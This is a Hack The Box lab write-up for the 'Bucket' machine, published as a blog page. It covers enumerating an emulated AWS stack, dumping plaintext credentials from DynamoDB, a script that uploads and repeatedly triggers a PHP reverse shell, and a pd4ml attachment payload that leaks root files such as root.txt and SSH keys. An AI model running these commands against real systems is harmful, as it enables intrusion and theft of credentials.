@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.82.0" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="light dark">
+<meta name="supported-color-schemes" content="light dark"><title>HTB Bucket&nbsp;&ndash;&nbsp;The Wolf Den</title><link rel="stylesheet" href="/css/core.min.db24d509394517ab20314e5a7b60f6c8ba9c33c7a31ba90272138bb555f028f51c9ca63d868beb0b7f43864537ce1920.css" integrity="sha384-2yTVCTlFF6sgMU5ae2D2yLqcM8ejG6kCchOLtVXwKPUcnKY9hovrC39DhkU3zhkg"><meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="HTB Bucket" /><body><section id="header">
+    <div class="header wrap"><span class="header left-side"><a class="site home" href="/"><img class="site logo" src="/img/NightWolf.jpg" alt /><span class="site name">The Wolf Den</span></a></span>
+        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/ctf-writeups">CTF Writeups</a><a class="nav item" href="/htb-writeups">HTB Writeups</a><a class="nav item" href="/about">About</a></nav></div></span></div></section><section id="content"><div class="article-container"><section class="article header">
+    <h1 class="article title">HTB Bucket</h1><p class="article date">2021-04-24</p></section><article class="article markdown-body"><p><img  src="/img/bucket-logo.png"
+        alt/></p>
+<p>Bucket is a very interesting box that replicates an AWS Cloud Stack. It&rsquo;s also quick to the draw on file clean up so some scripting is useful to obtain a foothold.</p>
+<h2 id="nmap">Nmap</h2>
+<p>Starting off with the usual nmap scan shows two open ports. A <code>bucket.htb</code> web page on port 80 and SSH on port 22.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sC -sV 10.10.10.212  
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> nightwolf:
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-10-29 22:27 UTC
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.212
+Host is up <span style="color:#f92672">(</span>0.099s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">998</span> closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Did not follow redirect to http://bucket.htb/
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 13.88 seconds
+</code></pre></div><p>We add <code>bucket.htb</code> to our <code>/etc/hosts</code> file and navigate to the page.</p>
+<p><img  src="/img/bucket-buckethomepage.png"
+        alt/></p>
+<p>Port 80 hosts single page website and not much else. No other pages are linked and there is no visible method to provide user input. The page&rsquo;s HTML does show some useful information however.</p>
+<p><img  src="/img/bucket-sources3.png"
+        alt/></p>
+<p>Images are being loaded from <code>s3.bucket.htb.</code> DNS won&rsquo;t resolve this so it requires an entry in /etc/hosts file to reach. There is some JSON stating something is &ldquo;running&rdquo;.</p>
+<p>Running FFUF on the S3 subdomain finds some more pages with useful information.</p>
+<pre><code> ffuf -u http://s3.bucket.htb/FUZZ -w /opt/dirbuster-wordlists/directory-list-2.3-medium.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://s3.bucket.htb/FUZZ
+ :: Wordlist         : FUZZ: /opt/dirbuster-wordlists/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+health                  [Status: 200, Size: 54, Words: 5, Lines: 1]
+shell                   [Status: 200, Size: 0, Words: 1, Lines: 1]
+server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
+:: Progress: [220547/220547] :: Job [1/1] :: 108 req/sec :: Duration: [0:33:52] :: Errors: 0 ::
+</code></pre><p><code>/health</code> states that s3 and dynamodb are running.</p>
+<p><img  src="/img/bucket-s3health.png"
+        alt/></p>
+<p><code>/server-status</code> is forbidden. <code>/shell</code> redirects to port 45566 before crashing out. Unless another <code>/</code> is added to the end. It then directs to a dynamodb web shell.</p>
+<p><img  src="/img/bucket-dynamodbjavascriptshell.png"
+        alt/></p>
+<p>This looks rather like AWS server of some kind. HTB isn&rsquo;t running off AWS though.  So there most be another explanation. Research for a how to set up AWS locally turns up LocalStack on GitHub, a project designed to emulate an Amazon cloud stack.</p>
+<p><a href="https://github.com/localstack/localstack">https://github.com/localstack/localstack</a></p>
+<p>It is designed to work as a local version of AWS and to emulate a number of it&rsquo;s components for testing. Awsclient, a tool for interacting with AWS services can also be used to interface with LocalStack.</p>
+<p>The S3 API  can be used to discover and  enumerate the contents of an S3 bucket.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># List Buckets</span>
+aws s3api list-buckets --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb/ --profile default
+
+<span style="color:#75715e"># List contents of bucket &#39;adserver&#39;</span>
+aws s3api list-objects --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb/ --profile default --bucket adserver
+</code></pre></div><p>A bucket called &ldquo;adserver&rdquo; is accessible without authentication. Listing the contents shows the images and <code>index.html</code> that were seen on the <code>bucket.htb</code> prior.</p>
+<p>Dynamodb,the other service that we have seen mentioned, is also accessible without authentication and contains a users table.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># List tables</span>
+aws dynamodb list-tables --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb/ --profile default
+
+<span style="color:#75715e"># Describe users table</span>
+aws dynamodb describe-table --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb/ --profile default --table-name users
+
+<span style="color:#75715e"># List the Content (Creds)</span>
+aws dynamodb scan --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb/ --profile default --table-name users
+</code></pre></div><p>Enumerating the contents of the users table, reveals a number of credentials.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aws dynamodb scan --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb/ --profile default --table-name users
+<span style="color:#f92672">{</span>
+    <span style="color:#e6db74">&#34;Items&#34;</span>: <span style="color:#f92672">[</span>
+        <span style="color:#f92672">{</span>
+            <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#f92672">{</span>
+                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Management@#1@#&#34;</span>
+            <span style="color:#f92672">}</span>,
+            <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#f92672">{</span>
+                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Mgmt&#34;</span>
+            <span style="color:#f92672">}</span>
+        <span style="color:#f92672">}</span>,
+        <span style="color:#f92672">{</span>
+            <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#f92672">{</span>
+                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Welcome123!&#34;</span>
+            <span style="color:#f92672">}</span>,
+            <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#f92672">{</span>
+                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Cloudadm&#34;</span>
+            <span style="color:#f92672">}</span>
+        <span style="color:#f92672">}</span>,
+        <span style="color:#f92672">{</span>
+            <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#f92672">{</span>
+                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;n2vM-&lt;_K_Q:.Aa2&#34;</span>
+            <span style="color:#f92672">}</span>,
+            <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#f92672">{</span>
+                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Sysadm&#34;</span>
+            <span style="color:#f92672">}</span>
+        <span style="color:#f92672">}</span>
+    <span style="color:#f92672">]</span>,
+    <span style="color:#e6db74">&#34;Count&#34;</span>: 3,
+    <span style="color:#e6db74">&#34;ScannedCount&#34;</span>: 3,
+    <span style="color:#e6db74">&#34;ConsumedCapacity&#34;</span>: null
+<span style="color:#f92672">}</span>
+</code></pre></div><p>These use to attempt login in over SSH on port 22. None return valid.</p>
+<p>Another option is  attempt to upload a web shell. This is a bit tricky as Bucket is very aggressive at cleaning up user files. In order to make sure we don&rsquo;t miss it, we create the following script to upload Pentest Monkey&rsquo;s PHP reverse shell and repeatedly request it. Start a netcat listener and run the script.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>x<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+
+aws --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb/ s3 cp magic.php s3://adserver/magic.php --profile default
+
+<span style="color:#75715e"># Trigger the reverse shell</span>
+
+<span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span>
+       curl http://bucket.htb/magic.php
+       echo Try: $x
+       <span style="color:#f92672">((</span>x<span style="color:#f92672">=</span>x+1<span style="color:#f92672">))</span>
+       sleep <span style="color:#ae81ff">2</span>
+
+<span style="color:#66d9ef">done</span>
+</code></pre></div><p>This uploads the reverse shell to the adserver bucket and then repeatedly requests it from the HTTP server. When the reverse shell has been published to the HTTP server a callback is received giving an attacker remote code execution.</p>
+<h2 id="user">User</h2>
+<p>The call back is as <code>www-data</code>. <code>/home</code> can be checked to show users that could be potentially be logged in to. <code>roy</code> is one such uaer. Logins can now be attempted on port 22 using the passwords obtained earlier. <code>n2vM-&lt;_K_Q:.Aa2</code>, is valid.</p>
+<h2 id="root">Root</h2>
+<p>There isn&rsquo;t anything promptly useful in <code>roy</code>&rsquo;s groups, sudo rights, or home folder.
+However, <code>/var/www/bucket-app</code>. index.php has some interesting content.</p>
+<p><img  src="/img/bucket-pd4cmd.png"
+        alt/></p>
+<p>The PHP code reveals that if an a post request is made where action is equal to <code>get_alerts</code>, the contents of the data field in the Ransomware table are converted into a PDF by a Java application called Pd4Cmd. This application has been exploited before as detailed in <a href="https://medium.com/bugbountywriteup/how-i-hacked-redbus-an-online-bus-ticketing-application-24ef5bb083cd"target="_blank">this article.</a></p>
+<p>It describes how a bug in Pd4Cmd was leveraged in to attach the content of arbitrary files to a generated PDF. This could used to leak sensitive files such as a root SSH key or <code>/etc/shadow</code>.</p>
+<p>Before that be done, <code>index.php</code> needs to be accessible. It&rsquo;s not on the HTTP sever we interacted with before, <code>bucket.htb</code>.  Settings for web Apache web servers can be found in, <code>/etc/apache2/ports.conf</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roy@bucket:/etc/apache2$ cat ports.conf
+<span style="color:#75715e"># If you just change the port or add more ports here, you will likely also</span>
+<span style="color:#75715e"># have to change the VirtualHost statement in</span>
+<span style="color:#75715e"># /etc/apache2/sites-enabled/000-default.conf</span>
+
+Listen <span style="color:#ae81ff">80</span>
+Listen 127.0.0.1:8000
+&lt;IfModule ssl_module&gt;
+        Listen <span style="color:#ae81ff">443</span>
+&lt;/IfModule&gt;
+
+&lt;IfModule mod_gnutls.c&gt;
+        Listen <span style="color:#ae81ff">443</span>
+&lt;/IfModule&gt;
+
+<span style="color:#75715e"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span>
+</code></pre></div><p>There is another server listening locally on port 8000. Checking it&rsquo;s contents with a curl returns the HTML content of <code>index.php</code>.</p>
+<p>Recalling aggressive cleanup scripts, it seems prudent to script our interactions.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> <span style="color:#75715e">#!/bin/bash</span>
+
+<span style="color:#75715e"># Create the alerts table. (It doesn&#39;t exist be default.)</span>
+aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName<span style="color:#f92672">=</span>title,AttributeType<span style="color:#f92672">=</span>S AttributeName<span style="color:#f92672">=</span>data,AttributeType<span style="color:#f92672">=</span>S --key-schema     AttributeName<span style="color:#f92672">=</span>title,KeyType<span style="color:#f92672">=</span>HASH AttributeName<span style="color:#f92672">=</span>data,KeyType<span style="color:#f92672">=</span>RANGE --provisioned-throughput ReadCapacityUnits<span style="color:#f92672">=</span>5,WriteCapacityUnits<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --endpoint-url http:    //s3.bucket.htb/
+
+<span style="color:#75715e"># Create an entry in the alerts table that contains our payload.</span>
+aws dynamodb put-item --table-name <span style="color:#e6db74">&#34;alerts&#34;</span> --item <span style="color:#e6db74">&#39;{ &#34;title&#34;: {&#34;S&#34;: &#34;Ransomware&#34;}, &#34;data&#34;: {&#34;S&#34;: &#34;&lt;pd4ml:attachment description=\&#34;attached.txt\&#34; icon=\&#34;    PushPin\&#34;&gt;file:///root/root.txt&lt;/pd4ml:attachment&gt;&#34;} }&#39;</span> --return-consumed-capacity Total --endpoint-url http://s3.bucket.htb/
+
+sleep <span style="color:#ae81ff">1</span>
+
+<span style="color:#75715e"># Scan the table and make sure our data is entered successfully.</span>
+aws dynamodb scan --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb/ --profile default --table-name alerts
+
+<span style="color:#75715e"># Log into Bucket over ssh and curl the local web server. Then copy the newly created results.pdf to /dev/shm for us to collect.</span>
+sshpass -p <span style="color:#e6db74">&#34;n2vM-&lt;_K_Q:.Aa2&#34;</span> ssh roy@bucket.htb <span style="color:#e6db74">&#34;curl http://127.0.0.1:8000/ -d &#39;action=get_alerts&#39;; sleep 5; cp /var/www/bucket-app/files/result.pdf /dev/shm/.file&#34;</span>
+</code></pre></div><p>After executing the above, <code>/dev/shm</code> contains root.txt. It is also possible to login as root by changing the file attachment to be an <code>/root/.ssh/id_rsa</code>.</p>
+<h2 id="wrap-up">Wrap Up</h2>
+<p>Learning about AWS was a large part of this box and it created a unique experience. It was a really enjoyable to learn about the platform and how to interact with it. Thanks MrR3boot for the machine!</p>
+</article></div>
+<div class="article bottom"><section class="article navigation"><p><a class="link" href="/posts/academy-writeup/"><span class="iconfont icon-article"></span>HTB Academy</a></p></section></div></section><section id="footer"><div class="footer-wrap">
+    <p class="copyright">The Wolf Den</p>
+    <p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
+        target="_blank">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
+        target="_blank">Notepadium</a></p></div></section></body>
+
+</html>
